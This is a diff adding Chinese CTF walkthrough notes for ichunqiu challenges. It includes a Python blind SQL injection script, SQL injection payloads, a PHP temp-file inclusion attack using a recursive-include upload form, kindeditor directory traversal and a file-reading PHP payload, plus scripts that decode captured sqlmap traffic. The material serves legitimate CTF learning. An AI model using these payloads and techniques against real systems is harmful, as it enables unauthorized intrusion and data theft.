@@ -540,6 +540,59 @@ https://www.jianshu.com/p/624fe6d09c0b
 ## 登录（i春秋）
 1.sql盲注
 
+```
+#-*- coding:utf-8 -*-
+from urllib.request import urlopen 
+from urllib import parse,request
+import sys
+import threading
+ 
+url = 'http://002f115eb5d744f4a42ccb59fb06ef340f840a366d4147f0.changame.ichunqiu.com/Challenges/login.php'
+
+def get_database_length():
+	for i in range(1,sys.maxsize):
+		username= "admin' or length(database())>{0}#"
+		username = username.format(i) 
+		values = {"username":username, 'password':''}   
+		data = parse.urlencode(values).encode('utf-8')  
+		response = request.Request(url, data)
+		response = urlopen(response) 
+		if len(response.read().decode()) != 4:
+			print("当前数据库长度为：", i)
+			return i
+
+def get_database_name():
+	global lock
+	lit=list("0123456789qwertyuioplkjhgfdsazxcvbnmPOIUYTREWQASDFGHJKLMNBVCXZ")
+	username="admin' or user() like '{0}%'#"
+    # username="admin' or p3ss_w0rd like '{0}%'#"
+	database=''
+	print("Start to retrive the database") 
+	while True:
+		curId=0
+		while True:  
+			if curId == len(lit): 
+				break
+			i = curId
+			curId += 1 
+			un=username.format(database+lit[i])
+			print(un)
+			values = {"username":un, 'password':''}      
+			data = parse.urlencode(values).encode('utf-8')  
+			response = request.Request(url, data)
+			response = urlopen(response) 
+			if len(response.read().decode()) == 4: 
+				database=database+lit[i]
+				print("the database is :%s" % database)  
+				break
+		if curId == len(lit):
+			print(database)
+			break
+
+print(get_database_length())
+get_database_name()
+```
+
 盲注的脚本都没跑出来
 
 2.git源码泄露
@@ -1041,6 +1094,116 @@ for i in range(1000):
 5.登录后提示flag在Get_Fl3g_e165421110ba03099a1c0393373c5b43.php，然后访问提示.txt，访问Get_Fl3g_e165421110ba03099a1c0393373c5b43.txt，出现源码，代码审计，通过?_SERVER[_SESSION][admin]=yes绕过
 
 最后找到flag，但提交不正确
-![image](https://note.youdao.com/src/46DA5245CC5348A5B6FBBA97BB5B6EF5)
+![image](http://note.youdao.com/yws/res/963/46DA5245CC5348A5B6FBBA97BB5B6EF5)
 
 [出题人讲解视频](https://www.ichunqiu.com/course/56349)
+
+## blog进阶
+
+1.第一步和前面相似，注入得出admin和19-10-1997进到管理页面，这里伪协议失效了，但是文件包含还是可以执行，访问/blog_manage/manager.php?module=../robotxs&name=txt可以看见flag.php路径
+
+2.这题是利用php对POST上传文件临时保存，在/tmp路径下，文件名为php{0-9A-Za-z}的随机字符，如果文件被php文件本身用到了，则php直接使用/tmp里的这个临时文件，如果没用到或者处理完毕了，则将/tmp下的这个临时文件删除。
+也就是说，在正常处理流程下，tmp目录下的这个文件存活周期是一次请求到响应，响应过后，它就会被删除，
+
+因为kindeditor那里存在的目录遍历漏洞，导致我们可以查看tmp目录下的文件列表，我们也可以对任一php文件post一个文件过去，使其暂存于tmp目录下，问题就在于，我们还没来得及包含这个文件，它就会在这次请求结束后被删除掉。
+
+通过无穷递归导致栈溢出，/X.php?include=X.php,使php无法进行此次请求的后续处理，也就是删除/tmp目录中我们通过post强行上传的临时文件。
+
+3.本地新建一个post
+```
+<!DOCTYPE html> 
+<html> 
+<head lang="en"> 
+  <meta charset="UTF-8"> 
+  <title>上传文件</title> 
+</head> 
+<body> 
+//上传的路径包含自己本身，形成无限循环
+<form action="http://bc691d207104471d8f78e43b4730424107fd1e27245e401a.changame.ichunqiu.com/blog_manage/manager.php?module=manager&name=php" method="post" enctype="multipart/form-data"> 
+  <input type="file" name="file"/> 
+  <input type="submit" value="提交"> 
+</form> 
+</body> 
+</html>
+```
+
+![image](http://note.youdao.com/yws/res/988/B41810D56FA046D0AB2F3D18CFF70BF4)
+
+访问/kindeditor/php/file_manager_json.php?path=../../../../../tmp/可以看见临时文件php5IXvQg，浏览器访问/blog_manage/manager.php?module=../../../../../tmp/php5IXvQg&name=phpa，php后面必须加任意字符才能访问到，不清楚为什么
+
+![image](http://note.youdao.com/yws/res/990/7C87F08968CB428E8EF74E8293467A4C)
+
+4. 上传读取flag.php的文件
+
+```
+<?php
+copy("/var/www/html/flag.php","/tmp/flag.txt");
+show_source("/tmp/flag.txt");
+//注意要用到show_source函数显示源码，否则会被解析，从下面也可以看到，flag的内容是在注释当中的
+?>
+```
+
+为什么用copy而不是webshell，是因为在phpinfo里可以看见大部分函数都被禁用了
+
+[大佬的博客1](https://blog.csdn.net/qq_30123355/article/details/58165038?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-4&utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-4)
+
+[大佬的博客2](https://blog.csdn.net/weixin_43940853/article/details/104602695?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-6&utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-6)
+
+## 
+
+> 第一关：
+winhex打开pcap文件，筛选http，追踪tcp流可以看见cookie里面有个user字段,这里的M3Iyp3D%3D是先经过base64编码，在rot13编码
+
+![image](http://note.youdao.com/yws/res/1013/E54A29EFA65D48FEA288192492A6D3B8)
+
+用Python脚本读pcap文件，找出user的盲注sql语句
+
+```
+from urllib import unquote
+import base64
+
+fp = open('1.pcapng', 'r')
+html = fp.readlines()
+
+fp.close()
+
+for i in html:
+    fd = i.find('user=')
+    fd1 = i.find(';', fd)
+    if fd1==-1:
+        fd1 = i.find('\r', fd)
+    if fd!=-1:
+        m = base64.b64decode(unquote(i[fd+5:fd1]).decode('rot_13'))
+        print(m)
+```
+
+盲注注入message表sqlmap的注入特点是当找到正确的字符时会进行!=不等于判断 所以可以查找这个关键字
+
+```
+fp = open('hhhh.txt', 'r')
+html = fp.readlines()
+l = ''
+for m in html:
+    if m.find('message') != -1 and m.find('!=') != -1:
+        if m.find('LIMIT 0,1)') != -1:
+            t1 = m.find('!=')
+            t2 = m.find(',', t1)
+            l += chr(int(m[t1+2:t2]))
+print(l)
+//my_password_is_ilovedaliang0，第一关的message，但是得去掉最后的0，查看了下txt，最后一句sql的payload和前几句不一样
+```
+
+> 第二关
+
+https://bbs.ichunqiu.com/thread-16297-1-1.html
+
+
+
+## 
+
+
+
+
+
+
+
